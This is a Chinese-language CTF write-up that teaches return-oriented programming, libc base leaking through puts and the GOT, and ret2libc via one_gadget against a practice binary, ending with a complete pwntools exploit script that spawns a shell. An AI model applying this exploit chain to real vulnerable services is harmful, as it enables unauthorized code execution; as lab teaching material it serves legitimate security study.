ROP概述
=====

ROP,即返回导向编程, 一个在CTF与真实世界的利用中都经常使用的手段. 同样地,这属于必学的基础内  
容, 需要完全理解与灵活运用.  
本文涵盖较多知识点,包括ROP,内存泄露,ret2libc. 如果能够独立做出本文中的例题,说明对这些概念就基  
本掌握了.ROP不是一个寄存器！！！  
详细解释这个手段之前,我们先来看下使用它的原因.

NX开启
====

NX,即不可执行,这个保护机制. 使用shellcode的前提是我们能控制允许代码执行的内  
存(如堆,栈). 但NX开启时,难道我们就无法利用栈溢出漏洞了吗?

ROP便是这一情况下最常用的利用手段. 我们通过寻找程序中已有的,以ret结尾的指令片段(这些片段被  
称为gadget),以劫持控制流.  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bb53de96137da288d886e22a4d65830412937d1e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bb53de96137da288d886e22a4d65830412937d1e.png)  
如上图,将返回地址覆盖为gadget1地址后, 程序返回到gadget1. gadget1完成我们想要进行的操作后,又  
会返回到gadget2, 如此一来,我们便能控制寄存器,并执行目标操作,如调用 system() 或 execve() .

例题
==

一如既往地,直接上题.  
<https://buuoj.cn/challenges#%5B%E7%AC%AC%E5%85%AD%E7%AB%A0%20CTF%E4%B9%8BPWN%E7%AB%A0%5DROP>  
(这题分还挺高的...不知道为什么)  
查看文件的架构与保护  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e54362de47b987b315754361533b571057dcf9f2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e54362de47b987b315754361533b571057dcf9f2.png)  
开启了NX, shellcode执行不了.  
没有开PIE,那么静态分析获取到的地址会是程序运行时的真实地址.  
也没有canary,因此我们可以随意栈溢出.

拖入IDA,程序很简单,使用了 gets 读取用户输入,因此存在栈溢出  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aff37ab2e397163dab5c852900943281548c8e3f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aff37ab2e397163dab5c852900943281548c8e3f.png)

返回地址的偏移为 10+8=18.

寻找gadget
========

第一步,寻找可用的gadget  
程序中没有 system() 这样的函数,因此我们想寻找 syscall 以调用 execve() .  
此外,还需要找能够控制寄存器的Gadget (如 pop rdi ; ret )  
此处我们使用ROPgadget这个工具寻找gadget.  
<https://github.com/JonathanSalwan/ROPgadget>

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4fd995507f076a2003b11ae856f48ceb011f572c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4fd995507f076a2003b11ae856f48ceb011f572c.png)  
有控制`rdi`,`rsi`等寄存器的`gadget`.  
不幸的是,没有`syscall`.

那该如何做呢? 这就引入了`ret2libc`的概念,程序是动态链接的,只要返回到`libc`当中,就能想怎么玩怎么玩  
了. 但首先,`libc`加载地址不固定,我们需要泄露出他的基地址.

完整思路
====

发现程序中有puts,可以利用它泄露出libc基址.  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-86e251cc2623c681c2582e52ad9465d57219737e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-86e251cc2623c681c2582e52ad9465d57219737e.png)

**完整思路如下:**

1. 通过栈溢出构造ROP链
2. 在ROP链中,利用`puts`泄露出`libc`中的地址,并使程序返回到 `main()` 函数
3. 计算出`one_gadget`地址

等等,什么是one\_gadget?

**one\_gadget**  
one\_gadget即是libc中现成的

```php
execve("/bin/sh",...,...)
```

代码片段，无需自己配置参数。这些片段可以通过使用`one_gadget`工具可以很方便的查找到。使用前提  
是能够泄露`libc`，且满足查找结果中显示的条件

4. 再次栈溢出, 覆盖返回地址为one\_gadget地址  
    暂时不能理解没关系,下面会一步步详细的讲

构造ROP链泄露Libc基址
==============

首先,返回地址的偏移为18

```php
padding = 'A'*18
payload = padding
```

其次,用于泄露地址的函数是 `puts` ,这是我们最好的选择,因为调用 `puts` 只需传一个参数,即只需控制rdi一  
个寄存器.  
那么,参数要是什么? 要输出什么才能泄露Libc当中的地址呢?  
答案是`GOT (Global Offset Table)`, `GOT`中会加载`Libc`当中对应函数的真实地址 (关于`GOT`和`PLT`的更多  
细节请自行阅读). 这题中,由于 `puts` 和 `gets` 都在 `main()` 函数当中被调用过, `GOT`中已加载好  
了 `puts` 和 `gets` 在`libc`中的真实地址. 我们只需泄露其中一个,此处选择泄露 `puts` 的真实地址.

即,在ROP中调用 `puts(got['puts'])` ,  
先在`ROPgadget`工具的输出中确定 pop rdi;ret 的地址,这个`gadget`能通过栈上的数据控制rdi寄存器

```php
elf = ELF("./rop")
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

pop_rdi = 0x00000000004005d3

#构造ROP链, 将GOT中puts的表项写入rdi寄存器,作为参数

payload += p64(pop_rdi)
payload += p64(puts_got)
#调用puts, 即puts(got['puts'])
payload += p64(puts_plt)
```

只是泄露了地址,程序就终止了,那可不行,在最后加上 main 函数的地址,使程序返回到 main 函数处继续运  
行

```php
main=0x400537
payload += p64(main)

target.recvuntil("hello\n")
target.sendline(payload)
```

成功泄露出libc中 puts 的真实地址,并返回到 main 函数  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fe044a1d1bfeceab38bae45a6c0ed6651680ca01.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fe044a1d1bfeceab38bae45a6c0ed6651680ca01.png)

通过ret2one\_gadget getshell
==========================

接下来要做的便很简单了: 读取泄露出的地址,根据固定的偏移计算出one\_gadget真实地址,并让程序返  
回到那里.

查找one\_gadget可以这个使用工具  
[https://github.com/david942j/one\_gadget](https://github.com/david942j/one_gadget)  
注意,one\_gadget要想成功运行需要满足 constraints 下面所显示的条件,此处使用 0x10a38c  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6195a9a136bbdcfb5c8b204c85978902184423a4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6195a9a136bbdcfb5c8b204c85978902184423a4.png)

完整exp
=====

```php
from pwn import *
import sys
if len(sys.argv) >1 and sys.argv[1] == 'r':
    target = remote("node3.buuoj.cn", )
else:
    #target = process("")
    #使用题目提供的libc
    target=process("./rop",env={"LD_PRELOAD":"./libc-2.271.so"})
    if(len(sys.argv)>1) and sys.argv[1]=='g':
        gdb.attach(target)

context.log_level='debug'

elf = ELF("./rop")
libC = ELF("./libc-2.271.so")
main=0x400537

padding = "A"*18
pop_rdi = 0x00000000004005d3

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

def s(in_put):
    target.recvuntil("hello\n")
    target.sendline(in_put)
def pwn():
    payload_leak = padding + p64(pop_rdi) + p64(puts_got) +p64(puts_plt) + p64(main)
    s(payload_leak)

    #读取libc中puts函数的地址
    puts_leak = u64(target.recvline().strip("\n").ljust(8,'\x00'))
    success("leak puts: "+hex(puts_leak))
    #计算libc基地址
    libc_leak = puts_leak - 0x809c0
    success("leak libc: "+hex(libc_leak))
    #计算one_gadget地址
    og = libc_leak + 0x10a38c
    payload = padding + p64(og)
    s(payload)

    target.interactive()
pwn()
```

成功getshell  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-01b57c2b654f7fff26d0ebf6c7f9401c6f074e86.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-01b57c2b654f7fff26d0ebf6c7f9401c6f074e86.png)